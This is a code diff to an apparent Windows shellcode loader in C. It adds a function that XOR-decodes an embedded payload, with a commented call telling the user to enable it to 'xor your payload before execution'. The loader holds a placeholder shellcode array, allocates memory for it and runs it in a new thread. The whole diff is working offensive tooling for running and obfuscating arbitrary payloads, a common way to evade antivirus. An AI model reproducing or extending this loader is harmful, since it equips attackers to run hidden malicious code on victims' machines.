@@ -3,11 +3,21 @@
 
 
 
+void XorShellcode(IN PBYTE pShellcode, IN SIZE_T dwSize, IN BYTE bKey)
+{
+	for (SIZE_T i = 0; i < dwSize; i++)
+	{
+		pShellcode[i] = pShellcode[i] ^ bKey;
+	}
+}
+
 void ShellcodeLoader()
 {
 	// Insert shellcode here
 	unsigned char shellCode[] = "\x90\x90\x90\x90";
 
+	// uncomment this to xor your payload before execution
+	//XorShellcode(shellCode, sizeof(shellCode), 0x69);
 
 	HANDLE hVirtualAlloc;
 	SIZE_T  dwSize = sizeof(shellCode);
@@ -42,7 +52,7 @@ void ShellcodeLoader()
 
 	// Wait for the thread to finish
 	WaitForSingleObject(hThread, INFINITE);
-	
+
 }
 
 
@@ -50,6 +60,8 @@ void ShellcodeLoader()
 
 int main()
 {
+
 	ShellcodeLoader();
+
 	return 0;
 }
